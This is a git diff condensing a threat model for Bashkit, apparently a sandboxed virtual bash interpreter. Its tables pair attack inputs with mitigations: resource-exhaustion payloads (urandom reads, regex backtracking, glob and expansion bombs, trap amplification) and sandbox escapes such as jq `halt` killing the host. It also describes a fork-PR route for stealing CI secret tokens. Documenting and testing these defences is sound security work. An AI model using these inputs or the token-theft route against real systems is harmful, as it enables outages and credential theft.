@@ -108,13 +108,7 @@ embedded in rustdoc. It contains:
 | TM-DOS-003 | Variable explosion | `x=$(cat /dev/urandom)` | /dev/urandom returns bounded 8KB | Mitigated |
 | TM-DOS-004 | Array growth | `arr+=(element)` in loop | Command limit | Mitigated |
 
-**Current Risk**: LOW - Input size and command limits prevent unbounded memory consumption
-
-**Implementation**: `ExecutionLimits` in `limits.rs`:
-```rust
-max_input_bytes: 10_000_000,    // 10MB script limit (TM-DOS-001)
-max_commands: 10_000,           // Command limit per exec() call (TM-DOS-002, TM-DOS-004)
-```
+**Current Risk**: LOW. Implementation: `ExecutionLimits` in `limits.rs` — `max_input_bytes` 10MB (TM-DOS-001), `max_commands` 10K per `exec()` (TM-DOS-002, TM-DOS-004).
 
 **Scope**: Limits are enforced **per `exec()` call**. Counters reset at the start of
 each invocation via `ExecutionCounters::reset_for_execution()`, so a prior script
@@ -185,19 +179,9 @@ delegation (see TM-DOS-046). Regression tests: `path_validation_security` module
 
 **Current Risk**: MEDIUM - OverlayFs limit accounting has multiple gaps (TM-DOS-034 to TM-DOS-039)
 
-**Implementation**: `FsLimits` struct in `fs/limits.rs`:
-```rust
-FsLimits {
-    max_total_bytes: 100_000_000,    // 100MB total (TM-DOS-005, TM-DOS-008, TM-DOS-009)
-    max_file_size: 10_000_000,       // 10MB per file (TM-DOS-005, TM-DOS-007)
-    max_file_count: 10_000,          // 10K files max (TM-DOS-006, TM-DOS-008)
-}
-```
+**Implementation**: `FsLimits` in `fs/limits.rs` — `max_total_bytes` 100MB (TM-DOS-005/008/009), `max_file_size` 10MB (TM-DOS-005/007), `max_file_count` 10K (TM-DOS-006/008).
 
-**Zip Bomb Protection** (TM-DOS-007):
-- Decompression operations check output size against `max_file_size`
-- Archive extraction checks total extracted size against `max_total_bytes`
-- Extraction aborts early if limits would be exceeded
+**Zip Bomb Protection** (TM-DOS-007): decompression checks output size against `max_file_size`; archive extraction checks total against `max_total_bytes` and aborts early.
 
 **Monitoring**: `du` and `df` builtins allow scripts to check usage
 
@@ -211,15 +195,7 @@ FsLimits {
 | TM-DOS-014 | Many directory entries | Create 1M files in one dir | `max_file_count` limit | **MITIGATED** |
 | TM-DOS-015 | Unicode path attacks | Homoglyph/RTL override chars | `validate_path()` rejects control chars and bidi overrides | **MITIGATED** |
 
-**Current Risk**: LOW - All vectors protected
-
-**Implementation**: `FsLimits` in `fs/limits.rs`:
-```rust
-max_path_depth: 100,           // Max directory nesting (TM-DOS-012)
-max_filename_length: 255,      // Max single component (TM-DOS-013)
-max_path_length: 4096,         // Max total path (TM-DOS-013)
-// validate_path() rejects control chars and bidi overrides (TM-DOS-015)
-```
+**Current Risk**: LOW. Implementation: `FsLimits` in `fs/limits.rs` — `max_path_depth` 100 (TM-DOS-012), `max_filename_length` 255 + `max_path_length` 4096 (TM-DOS-013); `validate_path()` rejects control chars and bidi overrides (TM-DOS-015).
 
 **Note**: Symlink loops (TM-DOS-011) are mitigated because InMemoryFs stores symlinks but doesn't
 follow them during path resolution - symlink targets are only returned by `read_link()`.
@@ -233,14 +209,7 @@ follow them during path resolution - symlink targets are only returned by `read_
 | TM-DOS-018 | Nested loops | `for i in ...; do for j in ...; done; done` | Per-loop + `max_total_loop_iterations` (1M) | **MITIGATED** |
 | TM-DOS-019 | Command loop | `echo 1; echo 2; ...` x 100K | Command limit (10K) | **MITIGATED** |
 
-**Current Risk**: LOW - Loop and command limits prevent infinite execution
-
-**Implementation**: `limits.rs`
-```rust
-max_loop_iterations: 10_000,           // Per-loop limit (TM-DOS-016, TM-DOS-017)
-max_total_loop_iterations: 1_000_000,  // Global cap across all loops (TM-DOS-018)
-max_commands: 10_000,                  // Per-exec() command limit (TM-DOS-019)
-```
+**Current Risk**: LOW. Implementation: `limits.rs` — `max_loop_iterations` 10K per loop (TM-DOS-016/017), `max_total_loop_iterations` 1M global (TM-DOS-018), `max_commands` 10K per `exec()` (TM-DOS-019).
 
 All counters (commands, loop iterations, total loop iterations, function depth)
 reset at the start of each `exec()` call. This ensures limits protect against
@@ -256,22 +225,7 @@ runaway scripts without permanently breaking the session.
 | TM-DOS-026 | Arithmetic recursion and expansion amplification | `$((((...))))`, `a=a+a; $((a))`, `i=arr[i]; $((arr[i]))` | `MAX_ARITHMETIC_DEPTH` limit (50), shared expansion fuel, cycle detection, expanded-size cap | **MITIGATED** |
 | TM-DOS-064 | Heredoc suffix re-injection CPU amplification | Many `: <<E && : <<E ...` heredocs on one logical line repeatedly copy command-line suffixes | `read_heredoc_with_strip_metered` reports re-injected suffix length; parser charges it to `max_parser_operations` fuel | **MITIGATED** |
 
-**Current Risk**: LOW - Both execution and parser protected
-
-**Implementation**: `limits.rs`, `parser/mod.rs`, `interpreter/mod.rs`
-```rust
-max_function_depth: 100,      // Runtime recursion (TM-DOS-020, TM-DOS-021)
-max_ast_depth: 100,           // Parser recursion (TM-DOS-022)
-// TM-DOS-021: Child parsers in command/process substitution inherit remaining
-// depth budget and fuel from parent parser (parser/mod.rs lines 1553, 1670)
-// TM-DOS-026: Arithmetic evaluator tracks recursion depth, capped at 50
-// (interpreter/mod.rs MAX_ARITHMETIC_DEPTH)
-// TM-DOS-026: Arithmetic evaluator tracks recursion depth, capped at 50.
-// Recursive variable expansion shares fuel, rejects variable cycles, and caps
-// generated arithmetic expression bytes.
-// (interpreter/mod.rs MAX_ARITHMETIC_DEPTH / MAX_ARITHMETIC_EXPANSION_*)
-// TM-DOS-064: Heredoc rest-of-line re-injection is charged to parser fuel
-```
+**Current Risk**: LOW. Implementation: `max_function_depth` 100 (TM-DOS-020/021) and `max_ast_depth` 100 (TM-DOS-022) in `limits.rs`; child parsers in command/process substitution inherit remaining depth budget + fuel from parent (TM-DOS-021, `parser/mod.rs`); arithmetic evaluator caps recursion at `MAX_ARITHMETIC_DEPTH` 50, shares expansion fuel, rejects variable cycles, and caps generated expression bytes (TM-DOS-026, `interpreter/mod.rs` `MAX_ARITHMETIC_DEPTH` / `MAX_ARITHMETIC_EXPANSION_*`); heredoc rest-of-line re-injection charged to parser fuel (TM-DOS-064).
 
 **History** (TM-DOS-021): Previously marked MITIGATED but child parsers created via
 `Parser::new()` used default limits, ignoring parent configuration. Fixed to propagate
@@ -283,10 +237,10 @@ max_ast_depth: 100,           // Parser recursion (TM-DOS-022)
 |----|--------|--------------|------------|--------|
 | TM-DOS-023 | Long computation | Complex awk/sed regex | Timeout (30s) | **MITIGATED** |
 | TM-DOS-024 | Parser hang | Malformed input | `parser_timeout` (5s) + `max_parser_operations` | **MITIGATED** |
-| TM-DOS-025 | Regex backtrack | `grep "a](*b)*c" file`; `grep -P '(a+)+$' file` | Default `regex` engine is linear-time (no catastrophic backtracking); `grep -P`/`sed` fancy-regex paths are capped by `FANCY_BACKTRACK_LIMIT` (1M steps) — a match that exceeds it yields "no match" rather than hanging | **MITIGATED** |
+| TM-DOS-025 | Regex backtrack | `grep "a](*b)*c" file`; `grep -P '(a+)+$' file` | Default `regex` engine is linear-time; `grep -P`/`sed` fancy-regex paths capped by `FANCY_BACKTRACK_LIMIT` (1M steps) — exceeding it yields "no match", not a hang | **MITIGATED** |
 | TM-DOS-027 | Builtin parser recursion | Deeply nested awk/jq expressions | `MAX_AWK_PARSER_DEPTH` (100) + `MAX_JQ_JSON_DEPTH` (100) | **MITIGATED** |
 | TM-DOS-028 | Diff algorithm DoS | `diff` on two large unrelated files | LCS matrix capped at 10M cells; falls back to simple line-by-line output | **MITIGATED** |
-| TM-DOS-029 | Arithmetic overflow/panic | `$(( 2 ** -1 ))`, `$(( 1 << 64 ))`, `i64::MIN / -1` | Arithmetic ops use `wrapping_*` / saturating semantics — `i64::MIN / -1` and unary negate go through `wrapping_neg`; `<<` / `>>` clamp the shift amount | **MITIGATED** |
+| TM-DOS-029 | Arithmetic overflow/panic | `$(( 2 ** -1 ))`, `$(( 1 << 64 ))`, `i64::MIN / -1` | `wrapping_*` / saturating ops; `wrapping_neg` for `i64::MIN / -1` and unary negate; `<<`/`>>` clamp shift amount | **MITIGATED** |
 | TM-DOS-030 | Parser limit bypass via eval/source/trap | `eval`, `source`, trap handlers now use `Parser::with_limits()` | — | **FIXED** (2026-03 audit verified) |
 | TM-DOS-031 | ExtGlob exponential blowup | `+(a\|aa)` against long string causes O(n!) recursion in `glob_match_impl` | `glob_match_impl` carries a recursion-depth cap and bails on excessive depth (`interpreter/glob.rs:162,324`); aliases that expand to huge brace ranges go through the same parser-budget check (`interpreter/mod.rs:4216`) | **MITIGATED** |
 | TM-DOS-035 | DEBUG trap recursive amplification | `trap 'a=1;b=2;...' DEBUG` amplifies N commands to N*M | Suppress DEBUG trap inside trap handlers (`in_trap` guard) | **FIXED** |
@@ -297,59 +251,40 @@ max_ast_depth: 100,           // Parser recursion (TM-DOS-022)
 | TM-DOS-053 | Template `{{#each}}` output explosion | `{{#each arr}}` on large JSON array produces O(n * body) output | Bounded by JSON data file size (max_file_size) | **MITIGATED** |
 | TM-DOS-054 | `glob --files` inherits ExtGlob blowup | `glob --files "+(a|aa)" /dir` dispatches to `glob_match` with same exponential cost as TM-DOS-031 | Same as TM-DOS-031 — `glob_match_impl` recursion-depth cap covers `glob --files` callers | **MITIGATED** |
 | TM-DOS-055 | `split` file count amplification | `split -l 1 bigfile` creates one output file per line; bounded by `max_file_count` FS limit | FS limits (TM-DOS-006) | **MITIGATED** |
-| TM-DOS-056 | `source` self-recursion stack overflow | Script that sources itself causes unbounded recursion; function depth limit doesn't apply to `source` | `source` increments the same call-depth counter as functions, so self- and mutual-recursion hit the configured `max_function_depth` and return a clean error rather than a SIGABRT | **MITIGATED** |
+| TM-DOS-056 | `source` self-recursion stack overflow | Script that sources itself recurses unboundedly | `source` shares the function call-depth counter; self-/mutual recursion hits `max_function_depth` with a clean error, not SIGABRT | **MITIGATED** |
 | TM-DOS-057 | `sleep` bypasses execution timeout | `sleep`, `(sleep N)`, `echo x \| sleep N`, `sleep N & wait`, `timeout N sleep N` all ignore `ExecutionLimits::timeout` | `Bash::exec_impl` wraps execution in `tokio::time::timeout(limits.timeout, …)` on non-WASM targets; WASM currently executes without that global timeout wrapper (`#[cfg(target_family = "wasm")]`) | **PARTIAL** |
 | TM-DOS-058 | Single-builtin unbounded output | `seq 1 1000000` produces 1M lines despite command limit; single builtin call generates unbounded output (see also #648) | `ExecutionLimits::max_stdout_bytes` and `max_stderr_bytes` truncate captured output (defaults set in `ExecutionLimits::new()`); see #648 | **MITIGATED** |
 | TM-DOS-059 | Parameter expansion replacement bomb | `${x//a/$(printf 'b%.0s' {1..1000})}` on large `x` amplifies output multiplicatively (10K × 1K = 10MB) | `max_total_variable_bytes` + `max_stdout_bytes` | **MITIGATED** |
 | TM-DOS-060 | Sparse array huge-index allocation | `arr[999999999]=x` could allocate ~1B empty slots if arrays are Vec-backed; negative indices could cause OOB | HashMap-based arrays; `max_array_entries` caps total entries | **MITIGATED** |
-| TM-DOS-061 | Snapshot function restore bypasses parser/function limits | Crafted snapshot restores prebuilt or deeply nested functions that exceed the current tenant's parser depth or function memory budget | Re-parse restored function source with current `ExecutionLimits`; re-apply function memory budget before insertion | **MITIGATED** |
+| TM-DOS-061 | Snapshot function restore bypasses parser/function limits | Crafted snapshot restores functions exceeding the tenant's parser depth or function memory budget | Restored function source re-parsed with current `ExecutionLimits`; function memory budget re-applied before insertion | **MITIGATED** |
 | TM-DOS-062 | jq file binding amplification | Repeated `--rawfile` / `--slurpfile` bindings to one max-sized VFS file multiply retained jq globals and `$ARGS.named` values without consuming more VFS quota | `MAX_FILE_VAR_REQUESTS` caps binding count; `MAX_FILE_VAR_BYTES` counts cumulative file bytes per binding before retaining globals | **MITIGATED** |
-| TM-DOS-063 | Persistent fd exhaustion | `exec N>/tmp/f` across many `N` values grows `exec_fd_table`/coproc fd buffers for the session | `ExecutionLimits::max_file_descriptors` (default 1024) caps persistent custom descriptors before inserts; reusing existing fd entries and standard fds 0/1/2 do not count | **MITIGATED** |
+| TM-DOS-063 | Persistent fd exhaustion | `exec N>/tmp/f` across many `N` values grows `exec_fd_table`/coproc fd buffers for the session | `ExecutionLimits::max_file_descriptors` (default 1024) caps persistent custom descriptors; reused fds and standard 0/1/2 don't count | **MITIGATED** |
 
-**TM-DOS-051** (mitigated): `builtins/yaml.rs` — `parse_yaml_block`, `parse_yaml_map`,
-`parse_yaml_list` carry a `depth: usize` parameter. When `depth > MAX_YAML_DEPTH = 100`,
-`parse_yaml_block` short-circuits with an `ERROR: maximum nesting depth exceeded` value
-instead of recursing further. `catch_unwind` (TM-INT-001) remains a backstop, but is no
-longer the primary defence. Regression tests:
+**TM-DOS-051** (mitigated): see table; `catch_unwind` (TM-INT-001) remains a backstop, no longer
+the primary defence. Regression tests:
 `tests/threat_model_tests.rs::yaml_template_depth::tm_dos_051_*`.
 
-**TM-DOS-052** (mitigated): `builtins/template.rs:render_template_inner()` receives a
-`depth` arg that increments on each `{{#if}}` / `{{#each}}` recursion. When
-`depth > MAX_TEMPLATE_DEPTH = 100`, the call returns a clean `template: maximum nesting
-depth exceeded` error. Regression test:
+**TM-DOS-052** (mitigated): see table. Regression test:
 `tests/threat_model_tests.rs::yaml_template_depth::tm_dos_052_template_if_depth_bomb`.
 
 **Current Risk**: LOW — TM-DOS-029, TM-DOS-030, and TM-DOS-031 are all mitigated
 (see the status table above). Their original write-ups are kept below for history.
 
-**TM-DOS-029** (mitigated): Arithmetic exponentiation cast `i64` to `u32` (`right as u32`),
-wrapping negatives; `i64::pow()` with a large exponent panicked or hung; shift operators panicked
-if `right >= 64` or `right < 0`; `i64::MIN / -1` panicked. Resolved: arithmetic ops use `wrapping_*`,
-shift amounts are masked, and the exponent is clamped (`interpreter/mod.rs` arithmetic evaluator).
-The same `i64::MIN / -1` guard is now applied in the `expr` builtin (`checked_div`/`checked_rem`).
+**TM-DOS-029** (mitigated): exponentiation cast `i64` to `u32` (wrapping negatives), `i64::pow()`
+panicked/hung on large exponents, shifts panicked when `right >= 64` or `< 0`, and `i64::MIN / -1`
+panicked. Resolved with `wrapping_*` ops, masked shift amounts, clamped exponent
+(`interpreter/mod.rs`); same `i64::MIN / -1` guard applied in `expr` (`checked_div`/`checked_rem`).
 
 **TM-DOS-030** (fixed): `eval`, `source`, trap handlers, and alias expansion previously used
-`Parser::new()`, ignoring configured `max_ast_depth` / `max_parser_operations`. Resolved: all of
-these paths use `Parser::with_limits()`. Separately, `eval` and alias expansion now run their bodies
-via `execute_script_body(.., run_exit_trap=false)` (like `source`) so they do not fire the EXIT trap
-— previously they ran the unguarded EXIT trap, letting `trap 'eval :' EXIT` recurse one command per
-level until the budget aborted.
+`Parser::new()`, ignoring configured `max_ast_depth` / `max_parser_operations`; now all use
+`Parser::with_limits()`. Separately, `eval` and alias expansion now run their bodies via
+`execute_script_body(.., run_exit_trap=false)` (like `source`) so they do not fire the EXIT trap
+— previously `trap 'eval :' EXIT` could recurse one command per level until the budget aborted.
 
-**TM-DOS-031** (mitigated): ExtGlob `+(...)` / `*(...)` handlers recursed without a depth limit.
-Resolved: `glob_match_impl` carries a recursion-depth cap and bails when exceeded
+**TM-DOS-031** (mitigated): see table — recursion-depth cap in `glob_match_impl`
 (`interpreter/glob.rs`).
 
-**Implementation**: `limits.rs`, `builtins/awk.rs`, `builtins/jq/`, `builtins/diff.rs`
-```rust
-timeout: Duration::from_secs(30),       // Execution timeout (TM-DOS-023)
-parser_timeout: Duration::from_secs(5), // Parser timeout (TM-DOS-024)
-max_parser_operations: 100_000,         // Parser fuel (TM-DOS-024)
-// TM-DOS-027: Builtin parser depth limits (compile-time constants)
-// MAX_AWK_PARSER_DEPTH: 100  (builtins/awk.rs) - awk expression recursion
-// MAX_JQ_JSON_DEPTH: 100     (builtins/jq/)  - JSON input nesting depth
-// TM-DOS-028: Diff LCS matrix cap (builtins/diff.rs)
-// MAX_LCS_CELLS: 10_000_000 - prevents O(n*m) memory/CPU blow-up
-```
+**Implementation**: `timeout` 30s + `parser_timeout` 5s + `max_parser_operations` 100K in `limits.rs` (TM-DOS-023/024); `MAX_AWK_PARSER_DEPTH` 100 (`builtins/awk.rs`) and `MAX_JQ_JSON_DEPTH` 100 (`builtins/jq/`) for TM-DOS-027; `MAX_LCS_CELLS` 10M (`builtins/diff.rs`) for TM-DOS-028.
 
 ---
 
@@ -376,16 +311,12 @@ max_parser_operations: 100_000,         // Parser fuel (TM-DOS-024)
 | TM-ESC-013 | OverlayFs upper() exposes unlimited FS | `OverlayFs::upper()` returns `InMemoryFs` with `FsLimits::unlimited()` | `OverlayFs::with_limits` constructs the upper layer via `InMemoryFs::with_limits(limits.clone())`, mirroring the overlay's limits onto upper. `add_file()` / `restore()` on that upper now run `validate_path` + `check_write_limits` (TM-ESC-012), so direct `upper()` writes are bounded by the same quota | **MITIGATED** |
 | TM-ESC-014 | BashTool custom builtins lost after first call | `std::mem::take` empties builtins on first `execute()`, removing security wrappers | Arc-cloned builtins survive across calls | **FIXED** |
 
-**TM-ESC-012**: `InMemoryFs::add_file()` is `pub` and does not call `validate_path()` or
-`check_write_limits()`. `restore()` deserializes without validation. Any code with `InMemoryFs`
-access can bypass all limits. Fix: add limit checks or restrict visibility to `pub(crate)`.
+**TM-ESC-012 / TM-ESC-013**: see table rows — both originally allowed any code with `InMemoryFs`
+access (or `overlay.upper()`) to bypass all limits; now every public write path runs
+`validate_path` + `check_write_limits` and the upper layer mirrors the overlay's limits.
 
-**TM-ESC-013**: `OverlayFs::upper()` returns `&InMemoryFs` with unlimited limits. Callers can
-write unlimited data via `overlay.upper().write_file()`. Fix: don't expose `upper()` publicly,
-or return a view that enforces the overlay's limits.
-
-**TM-ESC-014**: Fixed. `BashTool::create_bash()` now clones `Arc`-wrapped builtins instead of
-taking ownership via `std::mem::take`. Custom builtins persist across multiple calls. See `tool.rs:659-662`.
+**TM-ESC-014**: Fixed — `BashTool::create_bash()` clones `Arc`-wrapped builtins instead of
+`std::mem::take`, so custom builtins persist across calls. See `tool.rs:659-662`.
 
 **TM-ESC-016**: Fixed. `OverlayFs::rename` and `copy` previously used `read_file()` + `write_file()`
 which silently failed on symlinks (since `read_file` intentionally doesn't follow symlinks per
@@ -412,23 +343,14 @@ symlinks via `stat()` and use `read_link()` + `symlink()` to preserve them. Same
 - Stderr: `bash: <cmd>: command not found`
 - Script continues execution (unless `set -e`)
 
-**bash/sh Re-invocation** (TM-ESC-015): The `bash` and `sh` commands are handled
-specially to re-invoke the virtual interpreter rather than spawning external
-processes. This enables common patterns while maintaining security:
-- `bash -c "cmd"` executes within the same virtual environment constraints
-- `bash script.sh` reads and interprets the script in-process
-- `bash --version` returns Bashkit version (never real bash info)
-- Resource limits and virtual filesystem are shared with parent
-- No escape to host shell is possible
+**bash/sh Re-invocation** (TM-ESC-015): `bash` and `sh` re-invoke the virtual interpreter —
+never an external process. `bash -c "cmd"` / `bash script.sh` run in-process with shared
+resource limits and VFS; `bash --version` returns Bashkit version, never real bash info.
 
-**Script Execution by Path** (TM-ESC-006): Scripts can be executed by absolute
-path (`/path/to/script.sh`), relative path (`./script.sh`), or `$PATH` search.
-All execution stays within the virtual interpreter — no OS subprocess is spawned:
-- File must exist in VFS and have execute permission (mode & 0o111)
-- Exit 127 for missing files, exit 126 for non-executable or directories
-- Shebang line stripped; content parsed and executed as bash
-- `$0` = script name, `$1..N` = arguments via call frame
-- Resource limits and VFS constraints apply to executed scripts
+**Script Execution by Path** (TM-ESC-006): scripts run by absolute/relative path or `$PATH`
+search stay within the virtual interpreter — no OS subprocess. File must exist in VFS with
+execute permission (mode & 0o111); exit 127 missing / 126 non-executable; shebang stripped;
+`$0`/`$1..N` via call frame; resource limits and VFS constraints apply.
 
 #### 2.3 Privilege Escalation
 
@@ -460,25 +382,23 @@ All execution stays within the virtual interpreter — no OS subprocess is spawn
 | TM-INF-019 | `envsubst` exposes all env vars | `envsubst` substitutes `$VAR`/`${VAR}` from `ctx.env` — scripts can probe any env var | Same as TM-INF-001 (caller controls env) | **CALLER RISK** |
 | TM-INF-020 | `template` exposes env vars via `{{var}}` | Template builtin looks up variables from env as fallback after shell vars and JSON data | Same as TM-INF-001 (caller controls env) | **CALLER RISK** |
 | TM-INF-021 | Stack backtrace information disclosure | Panics leak internal source paths, dependency versions, and function names via stderr | Custom panic hook suppresses backtraces in CLI | **MITIGATED** |
-| TM-INF-022 | Library Debug shapes leak via stderr | Builtins wrapping external libs (jaq, regex, serde_json, semver, chrono, …) format errors with `format!("{:?}", e)` and dump internal struct shapes into stderr — e.g. jq printed `(File { code: "<800 chars of prepended compat-defs source>", path: () }, [("@tsv", Filter(0))])` to LLM agents | Three-layer enforcement, all run by `cargo test`: (1) static — `builtins::tests::no_debug_fmt_in_builtin_source` walks every `crates/bashkit/src/builtins/*.rs` and forbids `{:?}` / `{:#?}` / `{name:?}` (per-line opt-out: `// debug-ok: <reason>`); (2) dynamic per-tool — each tool's `mod tests` calls `bashkit::testing::assert_no_leak` with malformed inputs; (3) fuzz — every cargo-fuzz target plus 5 proptest cases call `bashkit::testing::assert_fuzz_invariants` against random input and check the same invariants on stderr/stdout | **FIXED** |
-| TM-INF-023 | jq `halt` / `halt_error` terminate the host process | jaq-std 3.0's `halt(N)` native calls `std::process::exit(exit_code)`. `defs.jq` wraps it with `def halt: halt(0);` and `def halt_error(...): ..., halt(...);`. Untrusted jq filters can invoke `halt` / `halt_error` to exit the entire embedding process, escaping the `ExecResult`-based sandbox boundary and causing process-wide DoS for any caller hosting bashkit. | Strip the upstream `halt` native from `jaq_std::funs::<D>()` and chain in a safe replacement that pops the variable argument and returns `Error::str("halt is disabled in the bashkit sandbox")`. The wrapper defs (`halt`, `halt_error`) still resolve, so callers see a normal jq runtime error (exit 5) instead of the host being killed. Regression tests in `builtins::jq::tests`: `halt_does_not_terminate_host_process`, `halt_with_arg_does_not_terminate_host_process`, `halt_error_does_not_terminate_host_process`. | **FIXED** |
-| TM-INF-024 | Host env side-channel via clap `Arg::env(...)` | Clap-based builtins ported from uutils (currently `ls`, with `.env("TABSIZE")` and `.env("TIME_STYLE")` on `uu_app()`) resolve those defaults from `std::env`, not bashkit's `ctx.env`. This breaks the sandbox boundary two ways: (1) presence-probe — a script can tell whether the host process has `TIME_STYLE`/`TABSIZE` set by observing `ls`'s behaviour; (2) availability — a host- or container-set `TIME_STYLE` materialises as a clap value source for an option bashkit hasn't implemented yet, so the unsupported-option gate fires on every plain `ls` and breaks the builtin for unrelated tenants | Four-layer fix: (1) **codegen strips runtime `.env(...)` and harvests it** — `bashkit-coreutils-port` rewrites `.env("FOO")` chained method calls out of every Arg builder it ports AND emits a sidecar `<UTIL>_ENV_DEFAULTS: &[EnvDefault]` table recording each stripped annotation; (2) **virtual-env shim** — `crate::builtins::clap_env::apply_env_defaults` rewrites argv from `ctx.env` (never `std::env`) before `try_get_matches_from`, emulating clap's "argv > env > default" precedence so uutils' env-default UX is preserved without re-opening the host channel; (3) **static guards** — `no_clap_env_in_generated_parsers` forbids runtime `.env(` calls in `generated/*.rs`, and `every_generated_parser_emits_env_defaults_table` enforces every util emits the sidecar (uniform surface, no per-util conditionals); (4) **defence-in-depth** — workspace `clap` dep drops the `env` cargo feature, so a re-introduced `.env(...)` fails to compile rather than silently re-opening the channel. Coverage: ls runtime tests pin both directions — `ls_ignores_host_time_style_and_tabsize` (host `std::env` ignored) and `ls_honors_virtual_env_time_style` (virtual `ctx.env` honoured) | **FIXED** |
-| TM-INF-025 | Untrusted generated Rust runs in drift CI with repository write token | The coreutils argument-drift workflow consumes third-party `uutils/coreutils` source, regenerates Rust from `uu_app()`, then builds/tests bashkit. If the generator preserved arbitrary upstream statements and the same job held `contents: write`/`pull-requests: write`, malicious upstream code could execute during parser construction with repository write impact. | Two-layer fix: (1) `bashkit-coreutils-port` validates args-mode `uu_app()` before emission and accepts only (a) a single tail clap `Command` builder expression or (b) `let <ident> = Command::new(...)<chain>; <ident>.<method>(...)<chain>` where the initializer is itself a Command::new chain and the tail's innermost receiver is the let-bound ident; both shapes run through the same disallowed-method/closure/macro/block visitor. Regression tests `rejects_executable_statements_in_uu_app`, `rejects_let_with_non_command_initializer`, `rejects_tail_not_chained_off_let_binding`, and `rejects_three_statement_body` prove write+abort, hijacked initializers, mismatched tails, and inserted statements all fail codegen. (2) `.github/workflows/coreutils-args-drift.yml` separates privilege: regeneration/build/test has only `contents: read` and `persist-credentials: false` on both checkouts; the later `open-pr` job gets write permission but does not build or execute generated Rust, only commits the tested artifact. | **FIXED** |
-| TM-INF-026 | Fork-PR secret exfiltration via approved CI run | GitHub's first-time-contributor approval gate runs the workflow file **from the PR head**, not an audited snapshot. Once a contributor is approved, subsequent pushes auto-run by default. The `examples` job in `.github/workflows/ci.yml` previously set `DOPPLER_TOKEN` at job level and `ANTHROPIC_API_KEY` at step level, so a fork PR could edit any `examples/*.rs`, `build.rs`, or shell script the job runs, read `$DOPPLER_TOKEN`/`$ANTHROPIC_API_KEY` from the environment, and exfiltrate. `DOPPLER_TOKEN` is the master key — it can fetch every other secret in the Doppler config (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GITHUB_TOKEN`, …), so a single leak compromises all of them. Additionally, every `doppler run --` in CI injected the entire Doppler config into the step's process env, exposing far more than the script under test actually reads. | Three-layer fix in `.github/workflows/ci.yml`, `js.yml`, `publish-js.yml`: (1) **fork guard** — secret-using steps gate on `github.event.pull_request.head.repo.fork != true` so fork PRs never see real secrets; `coverage.yml` and `js.yml` already followed this pattern. (2) **step-scoped secrets** — removed job-level `env: DOPPLER_TOKEN`; each step sets only the tokens it needs in its own `env:`. (3) **least-privilege Doppler injection** — every `doppler run` call site now uses `--only-secrets <KEY>` (e.g. `--only-secrets ANTHROPIC_API_KEY` for the LLM agent example, `--only-secrets OPENAI_API_KEY` for OpenAI-backed scripts) so the runtime env carries exactly the secret the script reads. Also migrated `ANTHROPIC_API_KEY` off GitHub Actions secrets onto Doppler so `DOPPLER_TOKEN` is the only secret CI needs from GitHub. | **FIXED** |
-| TM-INF-027 | Package publish from unverified release refs | A user with Actions/write privileges can manually dispatch release or publish workflows from a branch or from an unprotected `vX.Y.Z` tag. Because `release.yml` dispatches downstream package and CLI workflows with `--ref "$TAG"`, and `publish-js.yml` previously treated stable `package.json` semver as `latest` even on non-tag refs, an attacker-controlled ref could become the source for official crates.io/npm/PyPI release artifacts or prebuilt CLI/Homebrew artifacts. | Release dispatches require the full ref `refs/heads/main` (not the ambiguous short ref name), `release.yml` verifies the release source is reachable from `origin/main`, and it verifies the created tag resolves to the current `GITHUB_SHA` before dispatching publish workflows; `publish.yml` rejects manual publish runs unless `GITHUB_REF` is a stable release tag, verifies that tag matches `Cargo.toml`, and verifies the checked-out commit is reachable from `origin/main`; `publish-js.yml` verifies the publish commit is reachable from `origin/main`, only assigns npm `latest` for stable `vX.Y.Z` tag refs, and requires the tag version to match `package.json`; `publish-python.yml` gates artifact inspection/publication on the same main-reachable stable-tag and Cargo version checks; `cli-binaries.yml` accepts only stable `vX.Y.Z` inputs, verifies the workflow ref matches the tag, verifies the tag matches `Cargo.toml`, and verifies the tag commit is reachable from `origin/main` before building/uploading binaries or updating Homebrew. | **FIXED** |
-| TM-INF-028 | JS `onOutput` callback errors expose host stack traces | When a caller-supplied `onOutput` callback throws, `toNativeOnOutput` in `wrapper.ts` previously propagated `error.stack`, which contains host file paths (e.g. `/home/user/server/wrapper.ts:363`) and internal function names across the sandbox/caller boundary. Because script output is attacker-controlled and drives the callback, an attacker could trigger a throw and read host deployment paths from the resulting error. | Replace `error.stack` with `error.message` only; apply a regex to strip absolute-path and `file://` URL segments from the message (guards against attacker-controlled message injection); cap at 256 chars. Regression test `onOutput error does not leak stack trace or host paths` in `__test__/streaming-output.spec.ts` verifies no stack frames or host paths appear in the propagated error. Mitigation point annotated with `// THREAT[TM-INF-028]` in `wrapper.ts`. | **FIXED** |
+| TM-INF-022 | Library Debug shapes leak via stderr | Builtins wrapping external libs (jaq, regex, serde_json, semver, chrono, …) formatted errors with `{:?}`, dumping internal struct shapes (e.g. the jaq `File` struct incl. spliced compat-defs source) into agent-visible stderr | Three-layer enforcement, all run by `cargo test`: (1) static — `builtins::tests::no_debug_fmt_in_builtin_source` forbids `{:?}` / `{:#?}` / `{name:?}` in every `crates/bashkit/src/builtins/*.rs` (per-line opt-out: `// debug-ok: <reason>`); (2) dynamic per-tool — each tool's `mod tests` calls `bashkit::testing::assert_no_leak` with malformed inputs; (3) fuzz — every cargo-fuzz target plus 5 proptest cases call `bashkit::testing::assert_fuzz_invariants` and check the same invariants on stderr/stdout | **FIXED** |
+| TM-INF-023 | jq `halt` / `halt_error` terminate the host process | jaq-std 3.0's `halt(N)` native calls `std::process::exit()`; untrusted jq filters could exit the entire embedding process, escaping the `ExecResult` sandbox boundary (process-wide DoS) | Strip the upstream `halt` native from `jaq_std::funs::<D>()` and chain in a safe replacement returning `Error::str("halt is disabled in the bashkit sandbox")`; wrapper defs (`halt`, `halt_error`) still resolve, so callers see a normal jq runtime error (exit 5). Regression tests in `builtins::jq::tests`: `halt_does_not_terminate_host_process`, `halt_with_arg_does_not_terminate_host_process`, `halt_error_does_not_terminate_host_process` | **FIXED** |
